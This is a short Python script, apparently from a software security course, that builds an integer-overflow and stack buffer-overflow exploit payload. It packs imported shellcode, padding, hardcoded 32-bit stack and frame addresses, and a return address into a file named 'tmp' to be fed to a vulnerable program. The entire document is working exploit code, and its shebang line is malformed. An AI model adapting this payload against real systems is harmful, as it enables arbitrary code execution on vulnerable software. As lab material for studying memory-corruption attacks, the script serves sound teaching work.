#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode


count = 1073741838
count_packed = pack("<I", count)
fullbuffer = shellcode + "B"*3

other_mem = ""

other_mem += pack("<I", 0xbffefa98)
other_mem += pack("<I", 0x0804890b)

other_mem += pack("<I", 0xbffefa84)
other_mem += pack("<I", 0x00000004)
other_mem += pack("<I", 0x00000001)
other_mem += pack("<I", 0x080efa00)

other_mem += pack("<I", 0x00000000)
other_mem += pack("<I", 0x4000000e)
other_mem += pack("<I", 0xbffefa30)
other_mem += pack("<I", 0x080efa00)

other_mem += pack("<I", 0x00000000)
other_mem += pack("<I", 0x00000000)

end = "C"*4 + pack("<I", 0xbffefa30)



f = open("tmp", "wb")
f.write(count_packed + fullbuffer + other_mem + end)
f.close()
